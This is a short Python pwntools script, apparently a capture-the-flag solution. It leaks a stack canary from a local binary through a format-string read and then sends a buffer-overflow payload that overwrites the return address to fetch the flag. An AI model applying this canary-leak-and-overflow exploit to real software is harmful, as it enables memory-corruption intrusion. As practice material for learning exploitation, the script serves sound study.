from pwn import *
context.log_level = 'debug'

cn = process('./bin')
gdb.attach(cn)

cn.sendline('%7$x')
canary = int(cn.recv(),16)
print hex(canary)

cn.send('a'*100 + p32(canary) + 'a'*12 + p32(0x080491f2))

flag = cn.recv()

log.success('flag is:' + flag)
